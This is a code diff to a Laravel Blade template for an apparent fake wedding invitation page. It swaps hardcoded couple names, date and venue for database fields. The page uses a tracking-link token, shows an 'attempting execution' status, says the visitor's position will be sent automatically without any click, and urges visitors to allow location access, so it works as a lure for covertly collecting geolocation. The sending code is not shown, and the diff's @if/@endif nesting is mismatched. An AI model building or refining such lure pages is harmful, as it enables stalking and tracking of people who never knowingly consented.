@@ -33,23 +33,24 @@
         <div class="invite-card">
             <div class="couple">
                 <a href="{{ url('/share/' . $trackingLink->token) }}" class="btn btn-primary">BUKA</a>
-
+    @if($linkUndangan)
                 <div>
-                    <div class="name">Aisyah</div>
+                    <div class="name">{{ $linkUndangan->nama_pasangan_1 }}</div>
                     <div class="label">&amp;</div>
-                    <div class="name">Rafi</div>
+                    <div class="name">{{ $linkUndangan->nama_pasangan_2 }}</div>
                 </div>
-                <div class="date">Sabtu, 1 Agustus 2026</div>
+                <div class="date">{{ $linkUndangan->tanggal_pernikahan }}</div>
             </div>
 
             <div class="details">
                 <div class="detail-item"><strong>Waktu</strong> : 10.00 WIB</div>
-                <div class="detail-item"><strong>Lokasi</strong> : Gedung Serbaguna Harmoni</div>
+                <div class="detail-item"><strong>Lokasi</strong> : {{ $linkUndangan->lokasi_pernikahan }}</div>
                 <div class="detail-item"><strong>Status</strong> : <span id="status">Mencoba eksekusi... Mohon tunggu dan izinkan lokasi.</span></div>
             </div>
 
             <div id="log" class="info">Posisi Anda akan dikirim secara otomatis, tidak perlu klik apa pun.</div>
         </div>
+        @endif
 
         <div class="note">
             <p>Terima kasih sudah menjadi bagian dari momen spesial ini. Jika muncul permintaan lokasi, pilih Izinkan.</p>
